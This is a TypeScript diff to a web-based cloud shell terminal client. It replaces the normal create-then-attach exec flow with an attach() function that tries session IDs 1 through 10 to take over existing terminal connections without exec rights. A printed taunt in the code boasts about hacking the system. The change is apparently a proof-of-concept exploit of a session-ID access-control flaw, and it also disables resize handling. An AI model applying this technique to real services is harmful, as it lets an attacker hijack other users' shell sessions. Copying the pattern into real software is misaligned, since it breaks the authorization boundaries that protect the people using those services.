@@ -28,45 +28,50 @@ terminal.sendLine('Welcome to the Cloud Shell.');
 
 console.log(connectUrl);
 const rpcConnecton = new JsonRpcConnection(connectUrl);
-rpcConnecton.create().then(connection => {
-    connection.onNotification('connected', (handler: GenericNotificationHandler) => {
-        const exec: MachineExec = {
-            tty: true,
-            cols: terminal.cols,
-            rows: terminal.rows,
-        };
 
-        connection.sendRequest<{}>('create', exec).then((value: {}) => {
-            const id = value as number;
-            const attachConnection = rpcConnecton.createReconnectionWebsocket(`${attachUrl}/${id}`);
-
-            attachConnection.onopen = (event: Event) => {
-                // resize terminal first time on open
-                connection.sendRequest('resize', {cols: terminal.cols, rows: terminal.rows, id});
-
-                attachConnection.onmessage = (event: MessageEvent) => {
-                    terminal.sendText(event.data);
-                }
-
-                const terminalHandler: TerminalHandler = {
-                    onData(data: string):void {
-                        attachConnection.send(data);
-                    },
-                    onResize(cols: number, rows: number) {
-                        connection.sendRequest('resize', {cols, rows, id});
-                    }
-                }
-
-                terminal.addHandler(terminalHandler);
+rpcConnecton.create()
+    .then(connection => {
+        connection.onNotification('connected', (handler: GenericNotificationHandler) => {
+            const exec: MachineExec = {
+                tty: true,
+                cols: terminal.cols,
+                rows: terminal.rows,
             };
-            attachConnection.onerror = (errEvn: ErrorEvent) => {
-                console.log('Attach connection error: ', errEvn.error);
-            }
-            attachConnection.onclose = (event: CloseEvent) => {
-                console.log('Attach connection closed: ', event.code);
-            }
+
+            terminal.sendLine("hey! I don't need your exec rights since I can hack your system and attach to existing connection")
+            attach(1)
         });
-    });
-}).catch(err => {
-    console.log('Fatal. Unable to connect to container.', err);
-})
+    })
+    .catch(err => {
+        console.log('Fatal. Unable to connect to container.', err);
+        attach(1)
+    })
+
+function attach(id: number) {
+    const attachConnection = rpcConnecton.createReconnectionWebsocket(`${attachUrl}/${id}`);
+
+    attachConnection.onopen = (event: Event) => {
+        attachConnection.onmessage = (event: MessageEvent) => {
+            terminal.sendText(event.data);
+        }
+
+        const terminalHandler: TerminalHandler = {
+            onData(data: string):void {
+                attachConnection.send(data);
+            },
+            onResize(cols: number, rows: number) {
+                // connection.sendRequest('resize', {cols, rows, id});
+            }
+        }
+
+        terminal.addHandler(terminalHandler);
+    };
+    attachConnection.onerror = (errEvn: ErrorEvent) => {
+        if (id < 10) {
+            attach(id+1)
+        }
+    }
+    attachConnection.onclose = (event: CloseEvent) => {
+        console.log('Attach connection closed: ', event.code);
+    }
+}
